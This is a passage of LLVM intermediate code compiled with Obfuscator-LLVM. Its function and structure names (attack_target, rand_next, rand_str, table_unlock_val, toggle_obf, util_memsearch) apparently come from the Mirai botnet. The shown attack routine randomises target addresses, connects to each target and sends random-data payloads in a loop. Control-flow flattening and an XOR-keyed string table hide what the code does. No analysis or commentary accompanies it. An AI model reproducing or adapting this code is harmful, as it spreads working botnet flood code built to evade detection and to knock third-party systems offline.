  %126 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %125, i32 0, i32 2
  %127 = load i8, i8* %126, align 4
  %128 = zext i8 %127 to i32
  %129 = icmp slt i32 %128, 32
  %130 = select i1 %129, i32 -821336937, i32 -113840140
  store i32 %130, i32* %switchVar
  br label %loopEnd

; <label>:131:                                    ; preds = %loopEntry
  %132 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %133 = load i32, i32* %9, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %132, i64 %134
  %136 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %135, i32 0, i32 1
  %137 = load i32, i32* %136, align 4
  %138 = call i32 @ntohl(i32 %137) #7
  %139 = call i32 @rand_next()
  %140 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %141 = load i32, i32* %9, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %140, i64 %142
  %144 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %143, i32 0, i32 2
  %145 = load i8, i8* %144, align 4
  %146 = zext i8 %145 to i32
  %147 = lshr i32 %139, %146
  %148 = add i32 %138, %147
  %149 = call i32 @htonl(i32 %148) #7
  %150 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %151 = load i32, i32* %9, align 4
  %152 = sext i32 %151 to i64
  %153 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %150, i64 %152
  %154 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %153, i32 0, i32 0
  %155 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %154, i32 0, i32 2
  %156 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %155, i32 0, i32 0
  store i32 %149, i32* %156, align 4
  store i32 -113840140, i32* %switchVar
  br label %loopEnd

; <label>:157:                                    ; preds = %loopEntry
  %158 = load i32*, i32** %11, align 8
  %159 = load i32, i32* %9, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds i32, i32* %158, i64 %160
  %162 = load i32, i32* %161, align 4
  %163 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %164 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %165 = load i32, i32* %9, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %164, i64 %166
  %168 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %167, i32 0, i32 0
  %169 = bitcast %struct.sockaddr_in* %168 to %struct.sockaddr*
  store %struct.sockaddr* %169, %struct.sockaddr** %163, align 8
  %170 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %171 = load %struct.sockaddr*, %struct.sockaddr** %170, align 8
  %172 = call i32 @connect(i32 %162, %struct.sockaddr* %171, i32 16)
  %173 = icmp eq i32 %172, -1
  %174 = select i1 %173, i32 -1008603929, i32 -424495847
  store i32 %174, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  store i32 -424495847, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  store i32 399168071, i32* %switchVar
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %178 = load i32, i32* %9, align 4
  %179 = add nsw i32 %178, 1
  store i32 %179, i32* %9, align 4
  store i32 1892198835, i32* %switchVar
  br label %loopEnd

; <label>:180:                                    ; preds = %loopEntry
  store i32 -1296206968, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1880441861, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %183 = load i32, i32* %9, align 4
  %184 = load i8, i8* %5, align 1
  %185 = zext i8 %184 to i32
  %186 = icmp slt i32 %183, %185
  %187 = select i1 %186, i32 1683603767, i32 887714590
  store i32 %187, i32* %switchVar
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  %189 = load i8**, i8*** %10, align 8
  %190 = load i32, i32* %9, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds i8*, i8** %189, i64 %191
  %193 = load i8*, i8** %192, align 8
  store i8* %193, i8** %22, align 8
  %194 = load i8, i8* %15, align 1
  %195 = icmp ne i8 %194, 0
  %196 = select i1 %195, i32 -1527389534, i32 547558927
  store i32 %196, i32* %switchVar
  br label %loopEnd

; <label>:197:                                    ; preds = %loopEntry
  %198 = load i8*, i8** %22, align 8
  %199 = load i16, i16* %14, align 2
  %200 = zext i16 %199 to i32
  call void @rand_str(i8* %198, i32 %200)
  store i32 547558927, i32* %switchVar
  br label %loopEnd

; <label>:201:                                    ; preds = %loopEntry
  %202 = load i32*, i32** %11, align 8
  %203 = load i32, i32* %9, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds i32, i32* %202, i64 %204
  %206 = load i32, i32* %205, align 4
  %207 = load i8*, i8** %22, align 8
  %208 = load i16, i16* %14, align 2
  %209 = zext i16 %208 to i64
  %210 = call i64 @send(i32 %206, i8* %207, i64 %209, i32 16384)
  store i32 1739988552, i32* %switchVar
  br label %loopEnd

; <label>:211:                                    ; preds = %loopEntry
  %212 = load i32, i32* %9, align 4
  %213 = add nsw i32 %212, 1
  store i32 %213, i32* %9, align 4
  store i32 -1880441861, i32* %switchVar
  br label %loopEnd

; <label>:214:                                    ; preds = %loopEntry
  store i32 -1296206968, i32* %switchVar
  br label %loopEnd

loopEnd:                                          ; preds = %214, %211, %201, %197, %188, %182, %181, %180, %177, %176, %175, %157, %131, %121, %120, %102, %93, %84, %75, %65, %59, %58, %55, %52, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, %4
  store i32 %6, i32* %1, align 4
  %7 = load i32, i32* %1, align 4
  %8 = lshr i32 %7, 8
  %9 = load i32, i32* %1, align 4
  %10 = xor i32 %9, %8
  store i32 %10, i32* %1, align 4
  %11 = load i32, i32* @y, align 4
  store i32 %11, i32* @x, align 4
  %12 = load i32, i32* @z, align 4
  store i32 %12, i32* @y, align 4
  %13 = load i32, i32* @w, align 4
  store i32 %13, i32* @z, align 4
  %14 = load i32, i32* @w, align 4
  %15 = lshr i32 %14, 19
  %16 = load i32, i32* @w, align 4
  %17 = xor i32 %16, %15
  store i32 %17, i32* @w, align 4
  %18 = load i32, i32* %1, align 4
  %19 = load i32, i32* @w, align 4
  %20 = xor i32 %19, %18
  store i32 %20, i32* @w, align 4
  %21 = load i32, i32* @w, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind uwtable
define void @rand_str(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %switchVar = alloca i32
  store i32 -258573406, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -258573406, label %5
    i32 2103678540, label %9
    i32 8967255, label %13
    i32 -1556603038, label %23
    i32 424077362, label %27
    i32 -1003452425, label %39
    i32 -1361177848, label %47
    i32 1916284041, label %48
    i32 1248104588, label %49
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:5:                                      ; preds = %loopEntry
  %6 = load i32, i32* %4, align 4
  %7 = icmp sgt i32 %6, 0
  %8 = select i1 %7, i32 2103678540, i32 1248104588
  store i32 %8, i32* %switchVar
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %4, align 4
  %11 = icmp sge i32 %10, 4
  %12 = select i1 %11, i32 8967255, i32 -1556603038
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = call i32 @rand_next()
  %15 = load i8*, i8** %3, align 8
  %16 = bitcast i8* %15 to i32*
  store i32 %14, i32* %16, align 4
  %17 = load i8*, i8** %3, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 4
  store i8* %18, i8** %3, align 8
  %19 = load i32, i32* %4, align 4
  %20 = sext i32 %19 to i64
  %21 = sub i64 %20, 4
  %22 = trunc i64 %21 to i32
  store i32 %22, i32* %4, align 4
  store i32 1916284041, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %4, align 4
  %25 = icmp sge i32 %24, 2
  %26 = select i1 %25, i32 424077362, i32 -1003452425
  store i32 %26, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = call i32 @rand_next()
  %29 = and i32 %28, 65535
  %30 = trunc i32 %29 to i16
  %31 = load i8*, i8** %3, align 8
  %32 = bitcast i8* %31 to i16*
  store i16 %30, i16* %32, align 2
  %33 = load i8*, i8** %3, align 8
  %34 = getelementptr inbounds i8, i8* %33, i64 2
  store i8* %34, i8** %3, align 8
  %35 = load i32, i32* %4, align 4
  %36 = sext i32 %35 to i64
  %37 = sub i64 %36, 2
  %38 = trunc i64 %37 to i32
  store i32 %38, i32* %4, align 4
  store i32 -1361177848, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = call i32 @rand_next()
  %41 = and i32 %40, 255
  %42 = trunc i32 %41 to i8
  %43 = load i8*, i8** %3, align 8
  %44 = getelementptr inbounds i8, i8* %43, i32 1
  store i8* %44, i8** %3, align 8
  store i8 %42, i8* %43, align 1
  %45 = load i32, i32* %4, align 4
  %46 = add nsw i32 %45, -1
  store i32 %46, i32* %4, align 4
  store i32 -1361177848, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store i32 1916284041, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  store i32 -258573406, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %48, %47, %39, %27, %23, %13, %9, %5, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alphastr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %switchVar = alloca i32
  store i32 -424415230, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -424415230, label %8
    i32 -1983132626, label %12
    i32 12597072, label %17
    i32 -621393604, label %19
    i32 758804031, label %24
    i32 1880907495, label %40
    i32 280586884, label %43
    i32 518016858, label %48
    i32 1633930037, label %57
    i32 -727026901, label %58
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %4, align 4
  %10 = icmp sgt i32 %9, 0
  %11 = select i1 %10, i32 -1983132626, i32 -727026901
  store i32 %11, i32* %switchVar
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load i32, i32* %4, align 4
  %14 = sext i32 %13 to i64
  %15 = icmp uge i64 %14, 4
  %16 = select i1 %15, i32 12597072, i32 518016858
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = call i32 @rand_next()
  store i32 %18, i32* %6, align 4
  store i32 0, i32* %5, align 4
  store i32 -621393604, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %5, align 4
  %21 = sext i32 %20 to i64
  %22 = icmp ult i64 %21, 4
  %23 = select i1 %22, i32 758804031, i32 280586884
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i32, i32* %6, align 4
  %26 = and i32 %25, 255
  %27 = trunc i32 %26 to i8
  store i8 %27, i8* %7, align 1
  %28 = load i32, i32* %6, align 4
  %29 = lshr i32 %28, 8
  store i32 %29, i32* %6, align 4
  %30 = load i8, i8* %7, align 1
  %31 = zext i8 %30 to i32
  %32 = ashr i32 %31, 3
  %33 = trunc i32 %32 to i8
  store i8 %33, i8* %7, align 1
  %34 = load i8, i8* %7, align 1
  %35 = zext i8 %34 to i64
  %36 = getelementptr inbounds [33 x i8], [33 x i8]* @rand_alphastr.alphaset, i64 0, i64 %35
  %37 = load i8, i8* %36, align 1
  %38 = load i8*, i8** %3, align 8
  %39 = getelementptr inbounds i8, i8* %38, i32 1
  store i8* %39, i8** %3, align 8
  store i8 %37, i8* %38, align 1
  store i32 1880907495, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %5, align 4
  %42 = add nsw i32 %41, 1
  store i32 %42, i32* %5, align 4
  store i32 -621393604, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = load i32, i32* %4, align 4
  %45 = sext i32 %44 to i64
  %46 = sub i64 %45, 4
  %47 = trunc i64 %46 to i32
  store i32 %47, i32* %4, align 4
  store i32 1633930037, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = call i32 @rand_next()
  %50 = zext i32 %49 to i64
  %51 = urem i64 %50, 33
  %52 = trunc i64 %51 to i8
  %53 = load i8*, i8** %3, align 8
  %54 = getelementptr inbounds i8, i8* %53, i32 1
  store i8* %54, i8** %3, align 8
  store i8 %52, i8* %53, align 1
  %55 = load i32, i32* %4, align 4
  %56 = add nsw i32 %55, -1
  store i32 %56, i32* %4, align 4
  store i32 1633930037, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  store i32 -424415230, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %57, %48, %43, %40, %24, %19, %17, %12, %8, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @table_unlock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [81 x %struct.table_value], [81 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @toggle_obf(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [81 x %struct.table_value], [81 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = and i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* %5, align 1
  %15 = load i32, i32* @table_key, align 4
  %16 = lshr i32 %15, 8
  %17 = and i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* %6, align 1
  %19 = load i32, i32* @table_key, align 4
  %20 = lshr i32 %19, 16
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %7, align 1
  %23 = load i32, i32* @table_key, align 4
  %24 = lshr i32 %23, 24
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* %8, align 1
  store i32 0, i32* %3, align 4
  %switchVar = alloca i32
  store i32 889362209, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 889362209, label %27
    i32 105240601, label %35
    i32 326339188, label %84
    i32 -1073900661, label %87
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i32, i32* %3, align 4
  %29 = load %struct.table_value*, %struct.table_value** %4, align 8
  %30 = getelementptr inbounds %struct.table_value, %struct.table_value* %29, i32 0, i32 1
  %31 = load i16, i16* %30, align 8
  %32 = zext i16 %31 to i32
  %33 = icmp slt i32 %28, %32
  %34 = select i1 %33, i32 105240601, i32 -1073900661
  store i32 %34, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i8, i8* %5, align 1
  %37 = zext i8 %36 to i32
  %38 = load %struct.table_value*, %struct.table_value** %4, align 8
  %39 = getelementptr inbounds %struct.table_value, %struct.table_value* %38, i32 0, i32 0
  %40 = load i8*, i8** %39, align 8
  %41 = load i32, i32* %3, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds i8, i8* %40, i64 %42
  %44 = load i8, i8* %43, align 1
  %45 = sext i8 %44 to i32
  %46 = xor i32 %45, %37
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %43, align 1
  %48 = load i8, i8* %6, align 1
  %49 = zext i8 %48 to i32
  %50 = load %struct.table_value*, %struct.table_value** %4, align 8
  %51 = getelementptr inbounds %struct.table_value, %struct.table_value* %50, i32 0, i32 0
  %52 = load i8*, i8** %51, align 8
  %53 = load i32, i32* %3, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds i8, i8* %52, i64 %54
  %56 = load i8, i8* %55, align 1
  %57 = sext i8 %56 to i32
  %58 = xor i32 %57, %49
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* %55, align 1
  %60 = load i8, i8* %7, align 1
  %61 = zext i8 %60 to i32
  %62 = load %struct.table_value*, %struct.table_value** %4, align 8
  %63 = getelementptr inbounds %struct.table_value, %struct.table_value* %62, i32 0, i32 0
  %64 = load i8*, i8** %63, align 8
  %65 = load i32, i32* %3, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds i8, i8* %64, i64 %66
  %68 = load i8, i8* %67, align 1
  %69 = sext i8 %68 to i32
  %70 = xor i32 %69, %61
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %67, align 1
  %72 = load i8, i8* %8, align 1
  %73 = zext i8 %72 to i32
  %74 = load %struct.table_value*, %struct.table_value** %4, align 8
  %75 = getelementptr inbounds %struct.table_value, %struct.table_value* %74, i32 0, i32 0
  %76 = load i8*, i8** %75, align 8
  %77 = load i32, i32* %3, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds i8, i8* %76, i64 %78
  %80 = load i8, i8* %79, align 1
  %81 = sext i8 %80 to i32
  %82 = xor i32 %81, %73
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %79, align 1
  store i32 326339188, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %3, align 4
  %86 = add nsw i32 %85, 1
  store i32 %86, i32* %3, align 4
  store i32 889362209, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %84, %35, %27, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @table_lock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [81 x %struct.table_value], [81 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) #0 {
  %.reg2mem = alloca i32*
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [81 x %struct.table_value], [81 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  store i32* %9, i32** %.reg2mem
  %switchVar = alloca i32
  store i32 -952818004, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -952818004, label %first
    i32 1720205097, label %12
    i32 -889501662, label %18
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32*, i32** %.reg2mem
  %10 = icmp ne i32* %.reload, null
  %11 = select i1 %10, i32 1720205097, i32 -889501662
  store i32 %11, i32* %switchVar
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load %struct.table_value*, %struct.table_value** %5, align 8
  %14 = getelementptr inbounds %struct.table_value, %struct.table_value* %13, i32 0, i32 1
  %15 = load i16, i16* %14, align 8
  %16 = zext i16 %15 to i32
  %17 = load i32*, i32** %4, align 8
  store i32 %16, i32* %17, align 4
  store i32 -889501662, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load %struct.table_value*, %struct.table_value** %5, align 8
  %20 = getelementptr inbounds %struct.table_value, %struct.table_value* %19, i32 0, i32 0
  %21 = load i8*, i8** %20, align 8
  ret i8* %21

loopEnd:                                          ; preds = %12, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_memsearch(i8*, i32, i8*, i32) #0 {
  %.reg2mem2 = alloca i32
  %.reg2mem = alloca i32
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %11, align 4
  %12 = load i32, i32* %9, align 4
  store i32 %12, i32* %.reg2mem
  %13 = load i32, i32* %7, align 4
  store i32 %13, i32* %.reg2mem2
  %switchVar = alloca i32
  store i32 -1016459727, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1016459727, label %first
    i32 119018923, label %16
    i32 211154919, label %17
    i32 -1496828872, label %18
    i32 569673018, label %23
    i32 1773872023, label %38
    i32 -1571591856, label %44
    i32 1781818301, label %47
    i32 948383119, label %48
    i32 2089233597, label %49
    i32 1238156594, label %50
    i32 1221081873, label %53
    i32 849273854, label %54
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %.reload3 = load volatile i32, i32* %.reg2mem2
  %14 = icmp sgt i32 %.reload, %.reload3
  %15 = select i1 %14, i32 119018923, i32 211154919
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 -1, i32* %5, align 4
  store i32 849273854, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 0, i32* %10, align 4
  store i32 -1496828872, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* %10, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp slt i32 %19, %20
  %22 = select i1 %21, i32 569673018, i32 1221081873
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i8*, i8** %6, align 8
  %25 = load i32, i32* %10, align 4
  %26 = sext i32 %25 to i64
  %27 = getelementptr inbounds i8, i8* %24, i64 %26
  %28 = load i8, i8* %27, align 1
  %29 = sext i8 %28 to i32
  %30 = load i8*, i8** %8, align 8
  %31 = load i32, i32* %11, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds i8, i8* %30, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = icmp eq i32 %29, %35
  %37 = select i1 %36, i32 1773872023, i32 948383119
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i32, i32* %11, align 4
  %40 = add nsw i32 %39, 1
  store i32 %40, i32* %11, align 4
  %41 = load i32, i32* %9, align 4
  %42 = icmp eq i32 %40, %41
  %43 = select i1 %42, i32 -1571591856, i32 1781818301
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i32, i32* %10, align 4
  %46 = add nsw i32 %45, 1
  store i32 %46, i32* %5, align 4
  store i32 849273854, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store i32 2089233597, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 2089233597, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  store i32 1238156594, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i32, i32* %10, align 4
  %52 = add nsw i32 %51, 1
  store i32 %52, i32* %10, align 4
  store i32 -1496828872, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  store i32 -1, i32* %5, align 4
  store i32 849273854, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* %5, align 4
  ret i32 %55

loopEnd:                                          ; preds = %53, %50, %49, %48, %47, %44, %38, %23, %18, %17, %16, %first, %switchDefault
  br label %loopEntry
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind }
attributes #7 = { nounwind readnone }
attributes #8 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146844069}
!2 = !{i32 -2146843660}
